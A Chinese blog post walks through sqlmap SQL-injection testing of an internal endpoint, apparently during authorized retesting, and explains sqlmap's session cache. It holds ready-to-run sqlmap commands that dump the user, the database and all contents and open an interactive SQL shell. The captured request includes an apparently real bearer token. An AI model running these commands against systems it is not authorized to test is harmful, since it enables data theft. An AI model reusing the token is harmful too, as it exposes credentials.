---
title: SQL注入检测工具sqlmap
createTime: 2023/11/30 10:57:38
permalink: /article/python_sqlmap/
tags:
  - Python
  - sqlmap
---

# SQL注入检测工具sqlmap

## sqlmap工具介绍

sqlmap是一个开源渗透测试工具，自动化地进行SQL注入缺陷以及接入数据库服务。

项目主页：https://sqlmap.org/

## sqlmap使用记录

1. 到Sqlmap官网 `https://sqlmap.org/` 下载最新的 `sqlmap` 压缩包（注：使用sqlmap要求本地提前准备好python环境），下载的安装包直接进行解压即可。

   ![image-20231129222212682](/sqlmap/image-20231129222212682.png)

2. `sqlmap` 测试准备。

   - 对所需要测试的请求抓包处理。

     ![image-20231129222519348](/sqlmap/image-20231129222519348.png)

     ![image-20231129222541899](/sqlmap/image-20231129222541899.png)

     ![image-20231129222552131](/sqlmap/image-20231129222552131.png)

   - 将请求所需要的信息存储到本地的 `txt` 文件中，以如上抓包的请求为例编写 txt 测试文件。

     ```
     POST /ibdc/JF_E3base550/e3monitor/summary/ HTTP/1.1
     Host: 172.18.183.99:28009
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
     Accept: application/json, text/plain, */*
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate, br
     Content-Type: application/json
     X-Requested-With: XMLHttpRequest
     Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJncm91cFR5cGUiOiIwIiwiRW1haWwiOiJzaWRwQHNpLXRlY2guY29tLmNuIiwidXNlcl9uYW1lIjoic2lkcCIsImF1dGhJZHMiOltdLCJncm91cElkIjoiMGJiNmQ2MjAyNDNkNDViODg1ZDEwNDc3NmM2OGU4ZjQiLCJzYWxlVHlwZSI6bnVsbCwiam9iVGl0bGUiOm51bGwsInVzZXJuYW1lQ24iOiLmspnkuJjlpKfmlbDmja7nrqHnkIblkZgiLCJ0eXBlIjoiMCIsImF1dGhvcml0aWVzIjpbIui2hee6p-euoeeQhuWRmCJdLCJjbGllbnRfaWQiOiJkY29wLWFkbWluIiwibWFuYWdlclR5cGUiOm51bGwsImF1ZCI6WyJyZXNvdXJjZV9pZCJdLCJ1c2VybmFtZUVuIjoic2lkcCIsInBob25lIjoiMTMwODE4NTA3ODMiLCJzY29wZSI6WyJhbGwiXSwiaWQiOiJiOTI0OTgwMWE2Njk0ZTI2OTJmN2MyMTk0NmVkNWFlZiIsImV4cCI6MTcwMTM1MjU2MiwianRpIjoiNzFkZTUwNTEtMDg4NS00YmU1LWI2NTMtYzI5MTAwYWU0MDg0IiwiYWNjb3VudCI6InNpZHAiLCJ1c2VybmFtZSI6InNpZHAifQ.pSDfxCvGL2gOFYXDBm1ipLiQZFsmWVYEh1jr0I9yutCJ_GsUguVrM8mKESjg4giAcHnPN_RAwwoQcM4SJGeGaaN7--Ui8fTwqj3whfawPrOJ0nZ4YJybaMU19u7BKtamdQ0oxmc5Vy9a6Hk6yJPSSM6tBIAhq3R0NB2oSgo7W-k
     Content-Length: 29
     Origin: http://172.18.183.99:28002
     Connection: keep-alive
     Referer: http://172.18.183.99:28002/
     
     {"clustername":"JF_E3base550"}
     ```

3. SQL注入测试。

   - 获取数据库的当前用户。

     ```shell
     D:\Enviroment\Python37\python.exe sqlmap.py -r "jf_e3base550.txt" --current-user --tamper=space2comment
     ```

     ![image-20231129223206222](/sqlmap/image-20231129223206222.png)

   - 获取当前数据库

     ```sql
     D:\Enviroment\Python37\python.exe sqlmap.py -r "jf_e3base550.txt" --current-db  --tamper=space2comment
     ```

     ![image-20231129223537254](/sqlmap/image-20231129223537254.png)

   - 获取后端数据库的所有信息。

     ```shell
     D:\Enviroment\Python37\python.exe sqlmap.py -r "jf_e3base550.txt" --all --tamper=space2comment
     ```

     ![image-20231129230153743](/sqlmap/image-20231129230153743.png)

   - 交互式sql-shell

     ```shell
     D:\Enviroment\Python37\python.exe sqlmap.py -r "jf_e3base550.txt" --sql-shell --tamper=space2comment
     ```

     ![image-20231129223847400](/sqlmap/image-20231129223847400.png)

## sqlmap缓存问题

**问题现象：**

复测时，发现原有的漏洞修复后，依然能够正常返回结果。

![漏洞](/sqlmap/%E6%BC%8F%E6%B4%9E.png)

**问题原因：**

这是由于sqlmap在主机上有一个session的sqlite数据库，发现当前接口存在sql注入的漏洞时，会直接从缓存拿取结果，而不是实际发送请求，只有出现如下的内容才说明sqlmap实际发送了请求。

![缓存](/sqlmap/%E7%BC%93%E5%AD%98.png)

**问题处理：**

直接删除sqlmap在本地存储的sqlite数据库，再次发送请求，显示漏洞已处理。

![image-20231129224356659](/sqlmap/image-20231129224356659.png)

![漏洞已处理](/sqlmap/%E6%BC%8F%E6%B4%9E%E5%B7%B2%E5%A4%84%E7%90%86.png)
